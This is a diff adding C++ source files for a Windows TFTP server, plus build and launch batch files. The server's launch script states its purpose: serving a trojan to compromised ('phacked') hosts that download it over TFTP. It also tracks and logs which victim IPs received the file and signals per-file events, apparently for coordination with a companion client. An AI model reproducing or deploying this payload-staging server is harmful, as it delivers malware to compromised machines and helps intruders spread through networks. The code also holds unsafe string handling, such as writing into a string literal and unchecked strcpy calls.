@@ -1,0 +1,787 @@
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[TFTPSERV.CPP]ÄÄÄ
+////////x///////x///////x///////x///////x///////x///////x///////x///////x///
+
+#include "tftp.h"                       // protocol-specific consts
+
+////////x///////x///////x///////x///////x///////x///////x///////x///////x///
+
+#define TFTP_CLIENT_THREAD_MAX_TIME  600  // max summary work time, then terminate
+#define TFTP_SERVER_THREAD_MAX_TIME  60   // max time since idle, then restart
+#define TFTP_CLIENT_TIMEOUT          120  // max wait responce time, then disconnect
+#define TFTP_STOP_TIMEOUT            300  // used when stopping server, to finish xfer sessions
+#define TFTP_MONITOR_CHECKTIME       10   // when to check halted threads
+#define TFTP_MAX_CLIENT_THREAD_COUNT 64   // limit number of client threads
+
+struct tftp_client_struct : list_entry_struct
+{
+  DWORD          time0;         // creation GetTickCount()
+  SOCKET         io_socket;     // client SOCKET
+  HANDLE         handle;        // client thread handle
+  DWORD          server_ip;     // server ip, client connected to
+  sockaddr_in    addr;          // client ip:port
+  char           filename[MAXPATH]; // requested file
+};
+
+struct tftp_server_struct : list_entry_struct
+{
+  DWORD          time0;         // GetTickCount(), of last "alive" moment
+  SOCKET         listen_socket; // server SOCKET
+  HANDLE         handle;        // server thread handle
+  DWORD          server_ip;     // server ip, to listen on
+};
+
+struct tftp_sentok_struct : list_entry_struct
+{
+  DWORD          client_ip;     // client, who downloaded file from our server
+};
+
+////////x///////x///////x///////x///////x///////x///////x///////x///////x///
+
+list_struct tftp_server_list = {0,NULL,NULL}; // server threads, on ip:69
+list_struct tftp_client_list = {0,NULL,NULL}; // client threads
+list_struct tftp_sentok_list = {0,NULL,NULL}; // for each successful file xfer
+
+int    tftp_server_mustdie = 0;     // when set, all threads trying to exit
+HANDLE tftp_monitor_thread = NULL;  // handle of monitor-thread
+
+////////x///////x///////x///////x///////x///////x///////x///////x///////x///
+
+void tftp_senderr(SOCKET s, sockaddr_in addr)
+{
+  log("TFTP:sending error packet\n");
+
+  tftpbuf buf;
+
+  buf.th_opcode = htons( TFTP_ERROR );
+  buf.th_code   = htons( TFTP_EBADOP );
+  strcpy(buf.th_msg, "internal error");
+
+  int buflen = 4+strlen(buf.th_msg)+1;
+
+  if (sendto(s, (char*)&buf, buflen, 0, (sockaddr*)&addr, sizeof(sockaddr)) != buflen)
+  {
+    log("TFTP:ERROR:error sending error packet\n");
+  }
+}
+
+void WINAPI tftp_ClientThread(tftp_client_struct* client)
+{
+  list_attach(&tftp_client_list, (void*)client);
+
+  SOCKET t = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
+  if (t == INVALID_SOCKET)
+    log("TFTP:ERROR:cant create socket\n");
+  else
+  {
+    client->io_socket = t;
+
+    sockaddr_in addr = {AF_INET};
+    addr.sin_port = 0;                    // will be selected randomly
+    addr.sin_addr.s_addr = client->server_ip;
+
+    if ( bind(client->io_socket, (sockaddr*)&addr, sizeof(addr)) != 0 )
+      log("TFTP:ERROR:cant bind\n");
+    else
+    {
+      DWORD nb1 = 1;
+      ioctlsocket(client->io_socket, FIONBIO, &nb1);
+
+      int success = 0;
+
+      for(DWORD ack_block=0, need_ack=0;;)
+      {
+        tftpbuf buf;
+
+        if (need_ack)  // data acknowledge required?
+        {
+          int i;
+          for(i=0; i<TFTP_CLIENT_TIMEOUT; i++)
+          {
+            if (tftp_server_mustdie) break;
+            fd_set readfds;
+            readfds.fd_count = 1;
+            readfds.fd_array[0] = client->io_socket;
+            timeval timeout = {1,0};   // 1 sec
+            if (select(1, &readfds,NULL,NULL, &timeout) != 0) break;
+          }
+          if (i >= TFTP_CLIENT_TIMEOUT)
+          {
+            log("TFTP:ERROR:timeout\n");
+            break;
+          }
+          if (tftp_server_mustdie)              // terminate connection,
+          {                                     // allowing TFTP.EXE to exit
+            log("TFTP:terminated connection\n");
+            break;
+          }
+
+          int n = recvfrom(client->io_socket, (char*)&buf, 4+PKTSIZE, 0, NULL, NULL);
+          if (n == SOCKET_ERROR)
+          {
+            log("TFTP:ERROR:recvfrom error %i\n", WSAGetLastError());
+            break;
+          }
+          if ( (n != 4) || (ntohs(buf.th_opcode) != TFTP_ACK) )
+          {
+            log("TFTP:ERROR:invalid/error packet\n");
+            break;
+          }
+          ack_block = ntohs( buf.th_block );
+
+          status("TFTP",
+            MIN(ack_block*PKTSIZE,filesize),
+            MIN(ack_block*PKTSIZE,filesize),
+            filesize);
+
+          if (ack_block * PKTSIZE >= filesize+1)
+          {
+            log("TFTP:sent OK (%s --> %s)  \n",
+               inet_ntoa(*(in_addr*)&client->server_ip),
+               inet_ntoa(client->addr.sin_addr) );
+
+            tftp_sentok_struct* sentok = (tftp_sentok_struct*) malloc( sizeof(tftp_sentok_struct) );
+            if (sentok==NULL)
+              log("TFTP:ERROR:no memory\n");
+            else
+            {
+              sentok->client_ip = client->addr.sin_addr.s_addr;
+              list_attach(&tftp_sentok_list, (void*)sentok);
+            }
+
+            //
+            char id[1024];
+            strcpy(id, client->filename);
+            for(DWORD i=0; i<strlen(id); i++)
+              if ((id[i]>='a')&&(id[i]<='z')) id[i]-=32;
+            log("id=[%s]\n",id);
+            HANDLE h = CreateEvent(NULL,0,0, id);
+            if (h==NULL) log("err1\n");
+            if (GetLastError()!=ERROR_ALREADY_EXISTS) log("err2\n");
+            if (SetEvent(h)==0) log("err3\n");
+            CloseHandle(h);
+            //
+
+            success++;
+
+            break;
+          }
+
+        }//need_ack
+
+        buf.th_opcode = htons( TFTP_DATA );
+        buf.th_block  = htons( ack_block+1 );
+        int fileoffs = ack_block * PKTSIZE;
+        int blocksize = MIN(filesize-fileoffs, PKTSIZE);
+        if (blocksize != 0)
+          memcpy(buf.th_data, &filebuf[fileoffs], blocksize);
+        if ( sendto( client->io_socket, (char*)&buf, 4+blocksize, 0, (sockaddr*)&client->addr, sizeof(sockaddr)) != 4+blocksize )
+        {
+          log("TFTP:ERROR:sendto error\n");
+          break;
+        }
+        need_ack=1;
+
+        status("TFTP",
+          fileoffs+blocksize,
+          fileoffs,
+          filesize);
+
+      }//for each block
+
+      if (!success)
+        tftp_senderr(client->io_socket, client->addr);
+
+    }//bind
+
+    closesocket(client->io_socket);
+    client->io_socket = NULL;
+
+  }//socket
+
+  CloseHandle(client->handle);
+  client->handle = NULL;
+
+  list_detach(&tftp_client_list, (void*)client);
+
+  ExitThread(0);
+
+} // tftp_ClientThread
+
+void WINAPI tftp_ServerThread(tftp_server_struct* server)
+{
+  list_attach(&tftp_server_list, (void*)server);
+
+  log("TFTP:server listens at %s:69\n", inet_ntoa( *(in_addr*)&server->server_ip ));
+
+  SOCKET t = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
+  if (t == INVALID_SOCKET )
+    log("TFTP:ERROR:cant create socket\n");
+  else
+  {
+    server->listen_socket = t;
+
+    BOOL t = 1;
+    setsockopt(server->listen_socket, SOL_SOCKET, SO_REUSEADDR,
+               (char*)&t, sizeof(t));
+
+    sockaddr_in addr = {AF_INET};
+    addr.sin_port = htons(69);                    // TFTP port
+    addr.sin_addr.s_addr = server->server_ip;
+
+    if (bind(server->listen_socket, (sockaddr*)&addr, sizeof(sockaddr)) != 0)
+      log("TFTP:ERROR:cant bind\n");
+    else
+    {
+      DWORD nb1 = 1;
+      ioctlsocket(server->listen_socket, FIONBIO, &nb1);
+
+      for (;;)
+      {
+
+        server->time0 = GetTickCount();  // update last-alive time
+
+        fd_set readfds;
+        readfds.fd_count = 1;
+        readfds.fd_array[0] = server->listen_socket;
+        timeval timeout = {1,0}; // 1 sec
+
+        if (select(1, &readfds,NULL,NULL, &timeout) == 0)
+        {
+          if (tftp_server_mustdie)
+          {
+            log("TFTP:exiting\n");
+            break;
+          }
+          else
+            continue; // just timeout, no incoming data
+        }
+
+        BYTE buf[4+PKTSIZE];
+
+        sockaddr_in from = {AF_INET};
+        int fromlen = sizeof(from);
+        int n = recvfrom(server->listen_socket, buf, PKTSIZE, 0, (sockaddr*)&from, &fromlen);
+
+        log("TFTP:request from %s:%i, file=[%s]\n",
+          inet_ntoa(from.sin_addr),
+          ntohs(from.sin_port),
+          &buf[2]);
+
+        int success = 0;
+
+        if ((n < 2) || (ntohs(*(WORD*)&buf[0]) != TFTP_RRQ) )
+          log("TFTP:ERROR:invalid packet\n");
+        else
+        {
+          if (tftp_client_list.count >= TFTP_MAX_CLIENT_THREAD_COUNT)
+            log("TFTP:ERROR:thread limit\n");
+          else
+          {
+            tftp_client_struct* client = (tftp_client_struct*) malloc( sizeof(tftp_client_struct) );
+            if (client == NULL)
+              log("TFTP:ERROR:no memory\n");
+            else
+            {
+              client->server_ip = server->server_ip;
+              client->time0     = GetTickCount();
+              client->addr      = from;
+              strcpy(client->filename, &buf[2]);
+              DWORD tid;
+              client->handle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&tftp_ClientThread, (LPVOID)client, 0, &tid);
+              if (client->handle == NULL)
+              {
+                free(client);
+                log("TFTP:ERROR:cant create client thread\n");
+              }
+              else
+              {
+                success++;
+              }
+            }
+          }
+        }
+
+        if (!success)
+          tftp_senderr(server->listen_socket, from);
+
+      } // main server cycle
+
+    }//bind
+    closesocket(server->listen_socket);
+    server->listen_socket = NULL;
+  }//socket
+
+  CloseHandle(server->handle);
+  server->handle = NULL;
+
+  list_detach(&tftp_server_list, (void*)server);
+
+  ExitThread(0);
+
+} // tftp_ServerThread
+
+void tftp_start_server_thread(DWORD server_ip)
+{
+  tftp_server_struct* server = (tftp_server_struct*) malloc( sizeof(tftp_server_struct) );
+  if (server == NULL)
+    log("TFTP:ERROR:no memory\n");
+  else
+  {
+    server->server_ip = server_ip;
+    server->time0     = GetTickCount();
+    DWORD tid;
+    server->handle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&tftp_ServerThread, (LPVOID)server, 0, &tid);
+    if (server->handle == NULL)
+    {
+      log("TFTP:ERROR:cant create server thread\n");
+      free(server);
+    }
+  }
+} // tftp_start_server_thread
+
+void tftp_kill_server_thread(tftp_server_struct* server)
+{
+  if (server->handle)
+  {
+    SuspendThread( server->handle );
+    if (server->listen_socket)
+    {
+      closesocket( server->listen_socket );
+      server->listen_socket = NULL;
+    }
+    TerminateThread( server->handle,0 );
+    CloseHandle(server->handle);
+    server->handle = NULL;
+  }
+  list_detach(&tftp_server_list, (void*)server);
+} // tftp_kill_server_thread
+
+void tftp_kill_client_thread(tftp_client_struct* client)
+{
+  if (client->handle)
+  {
+    SuspendThread( client->handle );
+    if (client->io_socket)
+    {
+      closesocket( client->io_socket );
+      client->io_socket = NULL;
+    }
+    TerminateThread( client->handle,0 );
+    CloseHandle(client->handle);
+    client->handle = NULL;
+  }
+  list_detach(&tftp_client_list, (void*)client);
+} // tftp_kill_client_thread
+
+void WINAPI tftp_MonitorThread(int)
+{
+  for(;;)
+  {
+    Sleep(TFTP_MONITOR_CHECKTIME*1000);
+
+    if (tftp_server_mustdie) break;
+
+    EnterCriticalSection(&critical_section_list);
+
+    ForEach(tftp_client_list, tftp_client_struct, client)
+    {
+      if (GetTickCount() - client->time0 > TFTP_CLIENT_THREAD_MAX_TIME*1000)
+      {
+        log("TFTP:ERROR:timeout, terminating client\n");
+        tftp_kill_client_thread( client );
+        break;
+      }
+    }
+
+    ForEach(tftp_server_list, tftp_server_struct, server)
+    {
+      if (GetTickCount() - server->time0 > TFTP_SERVER_THREAD_MAX_TIME*1000)
+      {
+        log("TFTP:ERROR:timeout, restarting server\n");
+        DWORD save_ip = server->server_ip;
+        tftp_kill_server_thread( server );
+        tftp_start_server_thread( save_ip );
+        break;
+      }
+    }
+
+    LeaveCriticalSection(&critical_section_list);
+
+  }
+
+  CloseHandle(tftp_monitor_thread);
+  tftp_monitor_thread = NULL;
+
+  ExitThread(0);
+
+} // tftp_MonitorThread
+
+void tftp_StartServer()
+{
+  memset(&tftp_server_list, 0x00, sizeof(list_struct));
+  memset(&tftp_client_list, 0x00, sizeof(list_struct));
+  memset(&tftp_sentok_list, 0x00, sizeof(list_struct));
+
+  tftp_server_mustdie = 0;
+  tftp_monitor_thread = NULL;
+
+//for (list_int i=0; server_he->h_addr_list[i]!=NULL; i++)
+//  tftp_start_server_thread( *(DWORD*)server_he->h_addr_list[i] );
+
+  ForEach(hostaddr_list, hostaddr_struct, h)
+  {
+    tftp_start_server_thread( h->host_ip );
+  }
+
+  DWORD tid;
+  tftp_monitor_thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&tftp_MonitorThread, (LPVOID)NULL, 0, &tid);
+  if (tftp_monitor_thread == NULL)
+    log("TFTP:ERROR:cant create monitor thread\n");
+
+} // tftp_StartServer
+
+void tftp_StopServer()
+{
+  tftp_server_mustdie++;
+
+  for (int i=0; i < TFTP_STOP_TIMEOUT * 1000; i++)
+  {
+    if (tftp_server_list.count + tftp_client_list.count == 0) break;
+    Sleep(1000);
+  }
+
+  if (tftp_monitor_thread)  // in case of monitor thread halted
+  {
+    TerminateThread( tftp_monitor_thread,0 );
+    CloseHandle(tftp_monitor_thread);
+    tftp_monitor_thread = NULL;
+  }
+
+  while (tftp_server_list.count)        // halted server threads
+  {
+    log("TFTP:ERROR:terminating server\n");
+    tftp_kill_server_thread( (tftp_server_struct*)tftp_server_list.tail );
+  }
+
+  while (tftp_client_list.count)        // halted client threads
+  {
+    log("TFTP:ERROR:terminating client\n");
+    tftp_kill_client_thread( (tftp_client_struct*)tftp_client_list.tail );
+  }
+
+} // tftp_StopServer
+
+////////x///////x///////x///////x///////x///////x///////x///////x///////x///
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[TFTPSERV.CPP]ÄÄÄ
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[TFTP.H]ÄÄÄ
+// Trivial File Transfer Protocol (IEN-133)
+
+#define PKTSIZE                 512
+
+// Packet types.
+
+
+#define TFTP_RRQ                1               /* read request */
+#define TFTP_WRQ                2               /* write request */
+#define TFTP_DATA               3               /* data packet */
+#define TFTP_ACK                4               /* acknowledgement */
+#define TFTP_ERROR              5               /* error code */
+#define TFTP_OACK               6               /* extension? */
+
+// Error codes.
+
+#define TFTP_EUNDEF             0               /* not defined */
+#define TFTP_ENOTFOUND          1               /* file not found */
+#define TFTP_EACCESS            2               /* access violation */
+#define TFTP_ENOSPACE           3               /* disk full or allocation exceeded */
+#define TFTP_EBADOP             4               /* illegal TFTP operation */
+#define TFTP_EBADID             5               /* unknown transfer ID */
+#define TFTP_EEXISTS            6               /* file already exists */
+#define TFTP_ENOUSER            7               /* no such user */
+
+struct  tftpbuf
+{
+        WORD th_opcode;                    /* packet type */
+        union {
+                WORD tu_block;             /* block # */
+                WORD tu_code;              /* error code */
+                char tu_stuff[1];          /* request packet stuff */
+        } th_u;
+        char th_data[PKTSIZE];             /* data or error string */
+};
+
+#define th_block        th_u.tu_block
+#define th_code         th_u.tu_code
+#define th_stuff        th_u.tu_stuff
+#define th_msg          th_data
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[TFTP.H]ÄÄÄ
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[HOSTADDR.CPP]ÄÄÄ
+struct hostaddr_struct : list_entry_struct
+{
+  DWORD host_ip;
+};
+
+list_struct hostaddr_list = {0,NULL,NULL};
+
+void init_hostaddr_list()
+{
+  memset(&hostaddr_list, 0x00, sizeof(list_struct));
+
+  BYTE  computer[MAX_COMPUTERNAME_LENGTH+1];
+  gethostname(&computer[0], sizeof(computer));
+
+  hostent* he = gethostbyname(computer);
+  if ((he == NULL) || (he->h_addrtype != AF_INET))
+  {
+    log("ERROR:gethostbyname error\n");
+    return;
+  }
+
+  for (int i=0; he->h_addr_list[i]!=NULL; i++)
+  {
+    hostaddr_struct* hostaddr = (hostaddr_struct*) malloc( sizeof(hostaddr_struct) );
+    if (hostaddr == NULL)
+    {
+      log("ERROR:no memory\n");
+      return;
+    }
+    hostaddr->host_ip = *(DWORD*)he->h_addr_list[i];
+    list_attach(&hostaddr_list, (void*)hostaddr);
+  }
+}
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[HOSTADDR.CPP]ÄÄÄ
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[LIST.CPP]ÄÄÄ
+CRITICAL_SECTION critical_section_list;
+
+    // ForEach: on multithread lists, must be used under critical section
+#define ForEach( list, entry_s, var )        \
+  for( entry_s* var = (entry_s*) list.root;  \
+       var != NULL;                          \
+       var = (entry_s*) var->next )
+
+struct list_entry_struct                // list entry prototype
+{
+  list_entry_struct* next;              // pointer to next entry in list
+  DWORD whatever;                       // data
+};
+
+struct list_struct
+{
+  int count;                            // # of entries in list
+  list_entry_struct* root;              // first entry
+  list_entry_struct* tail;              // last entry
+};
+
+void list_attach(list_struct* list, void* entry)
+{
+  EnterCriticalSection(&critical_section_list);
+
+  list->count++;
+
+  list_entry_struct* l_entry = (list_entry_struct*) entry;
+
+  l_entry->next = NULL;
+
+  if (list->root == NULL)
+    list->root = l_entry;
+  else
+    list->tail->next = l_entry;
+
+  list->tail = l_entry;
+
+  LeaveCriticalSection(&critical_section_list);
+}
+
+void list_detach(list_struct* list, void* entry)
+{
+  EnterCriticalSection(&critical_section_list);
+
+  int success = 0;
+
+  for (list_entry_struct* t = list->root, *prev = NULL;
+       t != NULL;
+       prev = t, t = t->next)
+  {
+    if (t == entry)
+    {
+      if (t == list->tail) list->tail = prev;
+
+      if (prev)
+        prev->next = t->next;
+      else
+        list->root = t->next;
+
+      list->count--;
+
+      free( entry );
+
+      success++;
+
+      break;
+    }
+  }
+
+  if (!success)
+    log("ERROR:invalid list_detach operation\n");
+
+  LeaveCriticalSection(&critical_section_list);
+}
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[LIST.CPP]ÄÄÄ
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[LOG.CPP]ÄÄÄ
+#define LOG_USE_CS
+
+#ifdef LOG_USE_CS
+CRITICAL_SECTION critical_section_log;
+#endif
+
+void logEx(char* fname, char* fmt, ...)
+{
+#ifdef LOG_USE_CS
+  EnterCriticalSection(&critical_section_log);
+#endif
+
+  va_list va;
+  va_start(va, fmt);
+  char s[4096];
+  vsprintf(s, fmt, va);
+  va_end(va);
+
+  FILE*f=fopen(fname,"a+");
+  if (f==NULL)
+  {
+    printf("ERROR:CAN NOT WRITE TO FILE %s\n", fname);
+  }
+  else
+  {
+    fprintf(f, "%s", s);
+    fclose(f);
+  }
+
+  printf("%s", s);
+
+#ifdef LOG_USE_CS
+  LeaveCriticalSection(&critical_section_log);
+#endif
+}
+
+void log(char* fmt, ...)
+{
+  va_list va;
+  va_start(va, fmt);
+  char s[4096];
+  vsprintf(s, fmt, va);
+  va_end(va);
+
+  logEx("log", "%s", s);
+}
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[LOG.CPP]ÄÄÄ
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[SERVER.CPP]ÄÄÄ
+#include <windows.h>
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <io.h>
+#include <conio.h>
+#include <assert.h>
+
+#pragma hdrstop
+
+#define MIN(a,b)        ((a)<(b)?(a):(b))
+#define MAX(a,b)        ((a)>(b)?(a):(b))
+
+BYTE* filebuf  = NULL;
+DWORD filesize = 0;
+
+#include "log.cpp"
+#include "list.cpp"
+#include "hostaddr.cpp"
+#include "status.cpp"
+#include "tftpserv.cpp"
+
+void main(int argc, char* argv[])
+{
+  if (argc!=2)
+  {
+    printf("syntax: SERVER filename\n");
+    return;
+  }
+
+  // load file
+  FILE*f=fopen(argv[1],"rb");
+  if (f==NULL)
+  {
+    printf("ERROR: file not found: %s\n", argv[1]);
+    return;
+  }
+  filesize = filelength(fileno(f));
+  filebuf  = new BYTE[ filesize+PKTSIZE*2 ];
+  assert(filebuf);
+  fread(filebuf, 1,filesize, f);
+  fclose(f);
+
+  InitializeCriticalSection(&critical_section_log);
+  InitializeCriticalSection(&critical_section_list);
+
+  WSADATA WSAData;
+  if ( WSAStartup(MAKEWORD(1,1), &WSAData) != 0 )
+  {
+    log("TFTP:ERROR:WSAStartup failed\n");
+    return;
+  }
+
+  init_hostaddr_list();
+
+  tftp_StartServer();
+
+  printf("TFTP:server is running. press ESC to quit...\n");
+  while (!kbhit())
+  {
+    if (getch() == 27) break;
+    printf("TFTP:%i server threads, %i client threads, %i files sent\n",
+      tftp_server_list.count,
+      tftp_client_list.count,
+      tftp_sentok_list.count);
+  }
+
+/*
+  while (sentok_list.count < 100) // wait while 100 files successfully sent
+    Sleep(1000);
+*/
+
+  tftp_StopServer();
+
+  // process sentok_list here
+  ForEach(tftp_sentok_list, tftp_sentok_struct, sentok)
+  {
+    log("file sent to: %s\n", inet_ntoa( *(in_addr*)&sentok->client_ip ));
+  }
+
+  WSACleanup();
+
+  DeleteCriticalSection(&critical_section_log);
+  DeleteCriticalSection(&critical_section_list);
+}
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[SERVER.CPP]ÄÄÄ
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[STATUS.CPP]ÄÄÄ
+void status(char* msg, int n_sent, int n_ack, int n_total)
+{
+  char* s = "úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú";
+  memset(s, '°', n_sent * strlen(s) / n_total);
+  memset(s, '±', n_ack  * strlen(s) / n_total);
+  printf("%s [%s] %i/%i of %i\r", msg, s, n_sent, n_ack, n_total);
+}
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[STATUS.CPP]ÄÄÄ
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MAKE.BAT]ÄÄÄ
+@echo off
+bcc32.exe -lap -5 -C -P -pr -ff -O2 server.cpp cw32mt.lib
+del server.tds
+del server.obj
+move server.exe ..
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MAKE.BAT]ÄÄÄ
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[GO.BAT]ÄÄÄ
+:: start serving trojan.exe
+:: TFTP clients (TFTP.EXE), working on phacked hosts,
+:: will download it
+start server.exe calc.exe
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[GO.BAT]ÄÄÄ
